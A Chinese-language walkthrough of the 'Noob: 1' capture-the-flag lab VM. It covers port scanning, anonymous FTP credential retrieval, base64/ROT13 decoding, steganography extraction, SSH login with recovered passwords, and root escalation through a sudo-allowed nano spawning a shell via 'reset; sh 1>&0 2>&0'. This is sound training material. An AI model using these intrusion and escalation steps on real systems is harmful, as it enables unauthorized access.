---
title: "Noob: 1"
date: 2026-03-11
draft: false
weight: 1
tags: ["Nano提权", "隐写术", "GTFOBins", "ROT13解密", "Base64解码", "FTP匿名登录", "垂直提权"]
---

# 一、信息收集
## 1.1 使用nmap对目标靶机扫描
```ZSH
zsh: corrupt history file /home/kali/.zsh_history
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 1-65535 192.168.242.43
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:14 EST
Stats: 0:15:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.22% done; ETC: 17:29 (20:59:18 remaining)
```
`-A`综合扫描，开启后同时启用以下功能：
  1.操作系统探测`-O`（如windows10、ubuntu20.04、centos7）；
  2.服务版本探测`-sV`（如80端口是Apache、22端口是OpenSSH）;
  3.脚本扫描`-sC`，使用Nmap默认的探测脚本（NSE）检查常见漏洞或详细信息
  4.路由追踪`--traceroute`追踪本机到目标主机的路由路径
`-p`（port），`1-65535`覆盖所有TCP端口
但是几乎21h的等待时间太久，而攻略博主中的时间只有18s，这是由于博主的目标主机对关闭的端口返回了`RST`数据包，Nmap收到后立即跳过，无需等待，而我都情况是，目标主机开启了防火墙或处于丢弃包模式(Drop)，导致端口状态显示为`Filtered`，Nmap必须等待每个端口超时才能确定状态。

接下来为修正方案带命令：
第一步，快速发现开放端口
```zsh
nmap -sS -p 1-65535 --min-rate 5000 192.168.242.43 -oN ports.txt
```
结果如下：
```ZSH
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
65534/tcp open  unknown
```
第二步，针对性扫描服务详情
```zsh
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p 21,80,65534 192.168.242.43                  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-20 20:41 EST
Nmap scan report for 192.168.242.43
Host is up (0.00072s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-bounce: bounce working!
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.188.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 0        0              21 Sep 21  2021 cred.txt
|_-rw-r--r--    1 0        0              86 Jun 11  2021 welcome
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Login
|_http-server-header: Apache/2.4.29 (Ubuntu)
65534/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    Auth decrypt failed
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```
- 1.端口21(FTP)：
  - `| ftp-anon: Anonymous FTP login allowed (FTP code 230)`允许匿名登陆，任何人无需密码可进入FTP服务器
  - `| -rw-r--r--    1 0        0              21 Sep 21  2021 cred.txt`目录下存在名为`cred.txt`的文件，`cred`是Credentials凭据的缩写，大概率有账户密码
- 2.端口80(HTTP):
  - `|_http-title: Login`该网页是一个登录页面，结合FTP发现的`cred.txt`，这里通常是提交凭据、尝试获取系统权限的地方
- 3.端口65534(Unkown)：
  - `|_    Auth decrypt failed`返回授权解密失败，说明端口运行着一个非标准服务，等待特定加密字符串或认证密钥
- 4.扫描警告：
  - `Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`，Nmap无法找到关闭的端口，导致系统版本识别不准确，说明目标主机有防火墙屏蔽了大部分端口（第一次命令响应慢的原因）

## 1.2 ftp端口
`ftp://192.168.242.43`输入后无响应，是由于现代浏览器已停止支持`ftp://`协议，因此使用终端FTP客户端，ftp连接到目标靶机，Name中输入`anonymous`，Password直接回车，ftp>中输入ls，`get`将cred.txt和welcome下载下来，接着exit退出
```ZSH
┌──(kali㉿kali)-[~]
└─$ sudo ftp 192.168.242.43                   
[sudo] password for kali: 
Connected to 192.168.242.43.
220 (vsFTPd 3.0.3)
Name (192.168.242.43:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36513|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              21 Sep 21  2021 cred.txt
-rw-r--r--    1 0        0              86 Jun 11  2021 welcome
226 Directory send OK.
ftp> get cred.txt
local: cred.txt remote: cred.txt
229 Entering Extended Passive Mode (|||63973|)
150 Opening BINARY mode data connection for cred.txt (21 bytes).
100% |***************************************************************************************************************|    21        1.74 KiB/s    00:00 ETA
226 Transfer complete.
21 bytes received in 00:00 (1.04 KiB/s)
ftp> get welcome
local: welcome remote: welcome
229 Entering Extended Passive Mode (|||11859|)
150 Opening BINARY mode data connection for welcome (86 bytes).
100% |***************************************************************************************************************|    86       34.53 KiB/s    00:00 ETA
226 Transfer complete.
86 bytes received in 00:00 (16.18 KiB/s)
ftp> exit
221 Goodbye.
```

查看cred.txt，获得`Y2hhbXA6cGFzc3dvcmQ=`，接着进行`base64`命令解码：
```ZSH
┌──(kali㉿kali)-[~]
└─$ echo "Y2hhbXA6cGFzc3dvcmQ" | base64 -d                       
champ:password    
```
得到用户名champ，密码password

## 1.3 80端口
回到靶机ip界面登录80端口，单击about us会下载一个文件

# 二、信息分析

## 2.1文件整理
```ZSH
┌──(kali㉿kali)-[~]
└─$ cd ~/z_downloads

┌──(kali㉿kali)-[~/z_downloads]
└─$ ls         
funny.bmp  funny.jpg  sudo
```

## 2.2图片检查
### 2.2.1 binwalk工具
用binwalk查看图片
```ZSH
┌──(kali㉿kali)-[~/z_downloads]
└─$ binwalk funny.bmp 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

┌──(kali㉿kali)-[~/z_downloads]
└─$ binwalk funny.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01
```
没有发现什么
### 2.2.2 dirb工具
再扫描网站目录，dirb是用于web目录扫描的工具，通过内置的字典尝试在目标网站后面拼接常见路径（如`/admin`、`/config`、`/uploads`）
```ZSH
┌──(kali㉿kali)-[~/z_downloads]
└─$ dirb http://192.168.242.43

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Jan 20 21:40:20 2026
URL_BASE: http://192.168.242.43/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.242.43/ ----
+ http://192.168.242.43/index.html (CODE:200|SIZE:5825)
+ http://192.168.242.43/index.php (CODE:302|SIZE:0)
+ http://192.168.242.43/server-status (CODE:403|SIZE:279)

-----------------
END_TIME: Tue Jan 20 21:40:29 2026
DOWNLOADED: 4612 - FOUND: 3
```
### 2.2.3 dirsearch
安装dirsearch`sudo apt update && sudo apt install dirsearch -y`，其中`apt`是(advanced package tool)
```ZSH
┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://192.168.242.43
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                          
 (_||| _) (/_(_|| (_| )                                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/http_192.168.242.43/_26-01-20_21-55-58.txt

Target: http://192.168.242.43/

[21:55:58] Starting:                                                                                 
[21:55:59] 403 -  279B  - /.ht_wsr.txt                                      
[21:55:59] 403 -  279B  - /.htaccess.bak1                                   
[21:55:59] 403 -  279B  - /.htaccess.save                                   
[21:55:59] 403 -  279B  - /.htaccess.sample
[21:55:59] 403 -  279B  - /.htaccess.orig
[21:55:59] 403 -  279B  - /.htaccess_extra                                  
[21:55:59] 403 -  279B  - /.htaccess_sc                                     
[21:55:59] 403 -  279B  - /.htaccess_orig
[21:55:59] 403 -  279B  - /.htaccessBAK
[21:55:59] 403 -  279B  - /.htaccessOLD
[21:55:59] 403 -  279B  - /.htaccessOLD2
[21:55:59] 403 -  279B  - /.html                                            
[21:55:59] 403 -  279B  - /.htpasswds                                       
[21:55:59] 403 -  279B  - /.htpasswd_test
[21:55:59] 403 -  279B  - /.httr-oauth                                      
[21:56:00] 403 -  279B  - /.php                                             
[21:56:01] 403 -  279B  - /.htm                                             
[21:56:11] 200 -    0B  - /go.php                                           
[21:56:12] 302 -    0B  - /index.php  ->  index.html                        
[21:56:12] 302 -    0B  - /index.php/login/  ->  index.html                 
[21:56:14] 302 -    0B  - /logout.php  ->  index.html                       
[21:56:19] 403 -  279B  - /server-status/                                   
[21:56:19] 403 -  279B  - /server-status                                    
                                                                             
Task Completed
```
无可疑发现

### 2.4 steghide工具
安装steghide工具，`sudo apt install steghide -y`
再使用steghide，先对jpg进行分析并提取`hint.py`文件，接着对bmp进行分析，密码为sudo，再提取bmp的文件`user.txt`

```ZSH
┌──(kali㉿kali)-[~/z_downloads]
└─$ steghide info funny.jpg     
"funny.jpg":
  format: jpeg
  capacity: 2.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.py":
    size: 93.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes


echo -n "粘贴你的密码" | xxd
┌──(kali㉿kali)-[~/z_downloads]
└─$ steghide extract -sf funny.jpg
Enter passphrase: 
wrote extracted data to "hint.py".
                                                                                        
┌──(kali㉿kali)-[~/z_downloads]
└─$ ls
funny.bmp  funny.jpg  hint.py  sudo
                                                                                                    
┌──(kali㉿kali)-[~/z_downloads]
└─$ cat hint.py     
This is_not a python file but you are revolving around.
well, try_ to rotate some words too.

┌──(kali㉿kali)-[~/z_downloads]
└─$ steghide info funny.bmp
"funny.bmp":
  format: jpeg
  capacity: 2.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "user.txt":
    size: 29.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes

┌──(kali㉿kali)-[~/z_downloads]
└─$ steghide extract -sf funny.bmp
Enter passphrase: 
wrote extracted data to "user.txt".
```
`sudo`文件内容为：Did you notice the file name? Isn't is interesting?
`user.txt`文件内容为：jgs:guvf bar vf n fvzcyr bar
`hint.py`文件内容为：This is_not a python file but you are revolving around.well, try_ to rotate some words too.

根据hint文件提示，user中文件的字符串是rot加密，是rot13，解码后内容为：wtf:this one is a simple one

## 2.3 SSH登录
```ZSH
┌──(kali㉿kali)-[~/z_downloads]
└─$ ssh wtf@192.168.242.43 -p 55077
The authenticity of host '[192.168.242.43]:55077 ([192.168.242.43]:55077)' can't be established.
ED25519 key fingerprint is: SHA256:7llosBA8c0IhGD0Q/MfctQSSVRtzJrF8OOBmRA58IyE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.242.43]:55077' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
wtf@192.168.242.43's password: 
Permission denied, please try again.
wtf@192.168.242.43's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Jun 12 10:12:01 UTC 2025

  System load:  0.13              Processes:           114
  Usage of /:   49.9% of 8.79GB   Users logged in:     0
  Memory usage: 18%               IP address for ens3: 192.168.242.43
  Swap usage:   0%                IP address for ens4: 10.0.2.15

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

77 packages can be updated.
1 update is a security update.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 21 19:59:59 2021 from 192.168.169.1
 _________________________________________
/ Best of all is never to have been born. \
\ Second best is to die soon.             /
 -----------------------------------------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

```
接着找到第一个flag
```ZSH
wtf@wtf:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public
wtf@wtf:~$ cd Downloads
wtf@wtf:~/Downloads$ ls
flag-1.txt
wtf@wtf:~/Downloads$ cat flag-1.txt
VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg
```
进行解码
```ZSH
wtf@wtf:~/Downloads$ echo "VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg" | base64 -d
The flag is the encoded string itselfbase64: invalid input
```

接着检查/Documents文件夹
```ZSH
wtf@wtf:~$ cd ~/Documents
wtf@wtf:~/Documents$ ls
backup.sh
wtf@wtf:~/Documents$ cat backup.sh
REMOTE=1.2.3.4
SOURCE=/home/rooot
TARGET=/usr/local/backup
LOG=/home/rooot/bck.log 
DATE=`date +%y\.%m\.%d\.`
USER=n00b
#aw3s0m3p@$$w0rd

ssh $USER@$REMOTE mkdir $TARGET/$DATE

if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done    
else
    echo "Directory is not present" >> $LOG
    exit 0
fi
```
发现有用户名n00b，密码aw3s0m3p@$$w0rd

切换为n00b用户
```ZSH
wtf@wtf:~/Documents$ su n00b
Password: 
 _________________________________________
/ You will be recognized and honored as a \
\ community leader.                       /
 -----------------------------------------
   \
    \
        .--.
       |o_o |
       |:_/ |
      //   \ \
     (|     | )
    /'\_   _/`\
    \___)=(___/

```

# 三、提权
```ZSH
n00b@wtf:~$ pwd
/var/www/rooot
n00b@wtf:~$ sudo -l
Matching Defaults entries for n00b on wtf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User n00b may run the following commands on wtf:
    (root) NOPASSWD: /bin/nano
```
发现可以用nano编辑器，nano编辑器允许二进制文件以超级用户身份运行sudo，它不会放弃提升的权限
1. sudo nano
2. ctrl+r，ctrl+x
3. 输入`reset; sh 1>&0 2>&0`并回车
   1. 利用nano启用具有root权限的终端
   2. `reset`能初始化终端
   3. `sh`启动基本的shell，`1>&0`将标准输出(1)重定向到标准输入(0)，`2>&0`将标准错误(2)重定向到标准输入(0)

4. 界面会变得混乱，这是因为在nano这个应用程序内部强行开启一个shell
5. whoami
6. cd /root
7. cat root.txt

```ZSH
Command to execute: reset; sh 1>&0 2>&0# whoami                                                                                                             
rootet Help                                                                   ^X Read File
# lsancel                                                                     M-F New Buffer
# cd /root
# ls
root.txt  snap
# cat root.txt
RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg==

Follow me on Twitter https://www.twitter.com/Deepakhr9

TryHackMe --> https://www.tryhackme.com/p/Malwre99
Github --> https://www.github.com/Deepak-Aheer
(the flag is my LinkedIn username)


        THANK YOU for PLAYING THIS CTF

        But REMEMBER we're still N00bs ;)
# 
```

最终解码
`echo "RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg" | base64 -d`
其中`-d`是解码数据，结果如下
```ZSH
# echo "RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg" | base64 -d
Endorse me on linkedin => https://www.linkedin.com/in/deepak-aheer
base64: invalid input
```
